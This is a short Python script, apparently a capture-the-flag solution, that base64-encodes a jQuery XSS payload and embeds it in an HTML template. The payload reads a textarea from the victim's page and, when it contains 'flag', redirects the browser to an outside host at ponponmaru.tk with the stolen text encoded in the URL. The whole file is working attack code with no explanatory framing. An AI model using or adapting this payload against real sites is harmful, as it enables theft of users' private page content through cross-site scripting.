import base64

payload = b"""
$(document).ready(function() {
  $.get('/', (data) => {
    let rx = /<textarea class.+>(.*)<\/textarea>/g;
    let arr = rx.exec(data);
    let bio = arr[1];
    if (bio.indexOf("flag") !== -1) {
      location.href = "http://ponponmaru.tk:18002/?x=" + btoa(bio);
    } else {
      alert("Report me");
    }
  });
});
"""

with open("template.html", "r") as f:
    html = f.read().replace("#####", base64.b64encode(payload).decode())

print(html)
